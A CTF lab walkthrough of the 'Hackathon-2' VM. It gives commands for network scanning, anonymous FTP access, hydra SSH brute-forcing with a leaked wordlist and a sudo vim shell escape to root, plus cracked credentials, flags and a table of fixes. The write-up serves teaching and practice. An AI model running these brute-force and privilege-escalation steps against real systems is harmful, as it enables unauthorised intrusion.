# Hackathon-2 — CTF Walkthrough

**Target:** 192.168.1.38 | **OS:** Ubuntu 20.04.2 LTS | **Attacker:** Kali Linux 2025.4

---

## Attack Chain

```
Host Discovery → Nmap Scan → Web Enumeration → FTP Anonymous Login → Flag 1 → SSH Brute-Force → Initial Access → Privilege Escalation → Flag 2
```

---

## Steps

### 1. Host Discovery
```bash
netdiscover -r 192.168.1.0/24
```
ARP scan captured 27 packets from 11 hosts. Identified `192.168.1.38` (VMware VM) as the target.

---

### 2. Nmap Service Scan
```bash
nmap -sV -sV -p- 192.168.1.38
```

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 80/tcp | HTTP | Apache 2.4.41 (Ubuntu) |
| 7223/tcp | SSH | OpenSSH 8.2p1 |

> FTP anonymous login allowed. `flag1.txt` and `word.dir` visible without credentials.

---

### 3. Web Enumeration
```bash
gobuster dir -u http://192.168.1.38 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,zip,txt,php
```

| Path | Status |
|------|--------|
| /index.html | 200 |
| /robots.txt | 200 |
| /happy | 200 |

---

### 4. FTP Anonymous Login & File Download
```bash
ftp 192.168.1.38
# Username: Anonymous
# Password: (blank)
ftp> get flag1.txt
ftp> get word.dir
```
Logged in as Anonymous with blank password. Downloaded `flag1.txt` (47 bytes) and `word.dir` (849 bytes).

---

### 5. Flag 1 Found
```bash
cat flag1.txt
```
```
FLAG{7e3c118631b68d159d9399bda66fc684}
```

---

### 6. SSH Brute-Force with Custom Wordlist
```bash
hydra -l hackathon11 -P word.dir ssh://192.168.1.38 -s 7223
```
Used `word.dir` (downloaded from FTP) as password list. Cracked credentials: `hackathon11 : Tim@0`.

---

### 7. Initial Access
```bash
ssh hackathon11@192.168.1.38 -p 7223
```
```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)
```

---

### 8. Privilege Escalation — sudo vim GTFOBin
```bash
sudo vim -c '!/bin/sh'
```
Vim was allowed with sudo. Used vim's shell escape to get a root shell — no password needed.

```
# whoami
root
```

---

### 9. Flag 2 Found
```bash
cat /home/hackathon11/flag2.txt
```
```
FLAG{7e3c118631b68d159d9399bda66fc694}
```

---

## Flags

| Flag | Value |
|------|-------|
| Flag 1 | `FLAG{7e3c118631b68d159d9399bda66fc684}` |
| Flag 2 | `FLAG{7e3c118631b68d159d9399bda66fc694}` |

---

## Vulnerabilities

| Issue | Details | Fix |
|-------|---------|-----|
| FTP Anonymous Login | Anyone can login and download files | Disable anonymous FTP access |
| Sensitive files on FTP | word.dir exposed — used to crack SSH | Never store wordlists/credentials on public FTP |
| Weak SSH password | Tim@0 cracked via custom wordlist | Enforce strong passwords or key-based auth |
| sudo vim misconfiguration | vim allowed in sudoers → root shell | Remove vim from sudoers or use NOEXEC |

---

## Tools Used

`netdiscover` · `nmap` · `gobuster` · `ftp` · `hydra` · `ssh` · `vim (GTFOBin)`

---

> **Disclaimer:** For educational purposes in a controlled lab environment only.
